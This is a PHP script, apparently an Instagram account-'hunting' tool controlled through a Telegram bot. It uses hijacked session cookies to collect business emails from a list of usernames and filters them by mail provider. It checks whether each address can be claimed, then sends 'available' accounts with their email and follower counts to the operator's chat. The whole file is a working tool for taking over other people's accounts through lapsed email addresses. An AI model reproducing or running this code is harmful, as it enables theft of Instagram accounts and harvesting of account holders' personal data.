<?php
date_default_timezone_set('Asia/Baghdad');
$config = json_decode(file_get_contents('config.json'),1);
$id = $config['id'];
$token = $config['token'];
$config['filter'] = $config['filter'] != null ? $config['filter'] : 1;
$screen = file_get_contents('screen');
exec('kill -9 ' . file_get_contents($screen . 'pid'));
file_put_contents($screen . 'pid', getmypid());
include 'index.php';
$accounts = json_decode(file_get_contents('accounts.json') , 1);
$cookies = $accounts[$screen]['cookies'] . $accounts[$screen]['sessionid'];
$useragent = $accounts[$screen]['useragent'];
$users = explode("\n", file_get_contents($screen));
$uu = explode(':', $screen) [0];
$se = 100;
$i = 0;
$gmail = 0;
$hotmail = 0;
$yahoo = 0;
$mailru = 0;
$true = 0;
$false = 0;
$NotBussines = 0;
$edit = bot('sendMessage',[
    'chat_id'=>$id,
    'text'=>"جاري صيد يا قلبي 🔥",
    'parse_mode'=>'markdown',
    'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>' عدد اليوزرات المفحوصة 🔥'.$i,'callback_data'=>'fgf']],
                [['text'=>'على هذا اليوزر 🔥'.$user,'callback_data'=>'fgdfg']],
                [['text'=>"جيميل 🔥 $gmail",'callback_data'=>'dfgfd'],['text'=>"ياهو 🔥 $yahoo",'callback_data'=>'gdfgfd']],
                [['text'=>'روسي 🔥'.$mailru,'callback_data'=>'fgd'],['text'=>'هتوميل 🔥'.$hotmail,'callback_data'=>'ghj']],
                [['text'=>'متاح ✅'.$true,'callback_data'=>'gj']],
                [['text'=>'غير متاح ❌'.$false,'callback_data'=>'dghkf'],['text'=>'ليس بزنس ✖️'.$NotBussines,'callback_data'=>'dgdge']]
            ]
        ])
]);
$se = 100;
$editAfter = 1;
foreach ($users as $user) {
    $info = getInfo($user, $cookies, $useragent);
    if ($info != false ) {
        $mail = trim($info['mail']);
        $usern = $info['user'];
        $e = explode('@', $mail);
               if (preg_match('/(live|hotmail|outlook|yahoo|Yahoo|yAhoo)\.(.*)|(gmail)\.(com)|(mail|bk|yandex|inbox|list)\.(ru)/i', $mail,$m)) {
            echo 'check ' . $mail . PHP_EOL;
                    if(checkMail($mail, -10)) {
                        $inInsta = inInsta($mail);
                        if ($inInsta !== false) {
                            // if($config['filter'] <= $follow){
                                echo "True - $user - " . $mail . "\n";
                                if(strpos($mail, 'gmail.com')){
                                    $gmail += 1;
                                } elseif(strpos($mail, 'hotmail.') or strpos($mail,'outlook.') or strpos($mail,'live.com')){
                                    $hotmail += 1;
                                } elseif(strpos($mail, 'yahoo')){
                                    $yahoo += 1;
                                } elseif(preg_match('/(mail|bk|yandex|inbox|list)\.(ru)/i', $mail)){
                                    $mailru += 1;
                                }
                                $follow = $info['f'];
                                $following = $info['ff'];
                                $media = $info['m'];
                                bot('sendMessage', ['disable_web_page_preview' => true, 'chat_id' => $id, 'text' => "تم صيد متاح جديد بوسطه ملف ياسين المصري 🔥🔥🔥
يوزر المتاح = [$usern](instagram.com/$usern)\n 
اميل المتاح = [$mail]\n 
متابعين المتاح = $follow\n 
المتابعهم = $following\n 
بوستات المتاح = $media\n
تاريخ صيد متاح = ".date("Y")."/".date("n")."/".date("d")." : " . date('g:i') . "\n" . "
 (المطور @y_a_n_u_u)",
                                
                                'parse_mode'=>'markdown']);
                                
                                bot('editMessageReplyMarkup',[
                                    'chat_id'=>$id,
                                    'message_id'=>$edit->result->message_id,
                                    'reply_markup'=>json_encode([
                                        'inline_keyboard'=>[
                                            [['text'=>' عدد اليوزرات المفحوصة 🔥'.$i,'callback_data'=>'fgf']],
                                            [['text'=>'على هذا اليوزر 🔥'.$user,'callback_data'=>'fgdfg']],
                                            [['text'=>"جيميل 🔥 $gmail",'callback_data'=>'dfgfd'],['text'=>"ياهو 🔥 $yahoo",'callback_data'=>'gdfgfd']],
                                            [['text'=>'روسي 🔥'.$mailru,'callback_data'=>'fgd'],['text'=>'هتوميل 🔥'.$hotmail,'callback_data'=>'ghj']],
                                            [['text'=>'متاح ✅'.$true,'callback_data'=>'gj']],
                                            [['text'=>'غير متاح ❌'.$false,'callback_data'=>'dghkf'],['text'=>'ليس بزنس ✖️'.$NotBussines,'callback_data'=>'dgdge']]
                                        ]
                                    ])
                                ]);
                                $true += 1;
                            // } else {
                            //     echo "Filter , ".$mail.PHP_EOL;
                            // }
                            
                        } else {
                          echo "No Rest $mail\n";
                        }
                    } else {
                        $false +=1;
                        echo "Not Vaild 2 - $mail\n";
                    }
        } else {
          echo "BlackList - $mail\n";
        }
    } else {
         $NotBussines +=1;
        echo "NotBussines - $user\n";
    }
    usleep(1555555);
    $i++;
    if($i == $editAfter){
        bot('editMessageReplyMarkup',[
            'chat_id'=>$id,
            'message_id'=>$edit->result->message_id,
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>' عدد اليوزرات المفحوصة 🔥'.$i,'callback_data'=>'fgf']],
                    [['text'=>'على هذا اليوزر 🔥'.$user,'callback_data'=>'fgdfg']],
                    [['text'=>"جيميل 🔥 $gmail",'callback_data'=>'dfgfd'],['text'=>"ياهو 🔥 $yahoo",'callback_data'=>'gdfgfd']],
                    [['text'=>'روسي 🔥'.$mailru,'callback_data'=>'fgd'],['text'=>'هتوميل 🔥'.$hotmail,'callback_data'=>'ghj']],
                    [['text'=>'متاح ✅'.$true,'callback_data'=>'gj']],
                    [['text'=>'غير متاح ❌'.$false,'callback_data'=>'dghkf'],['text'=>'ليس بزنس ✖️'.$NotBussines,'callback_data'=>'dgdge']]
                ]
            ])
        ]);
        $editAfter += 1;
    }
}
bot('sendMessage', ['chat_id' => $id, 'text' =>"YASEEN : ".explode(':',$screen)[0]]);





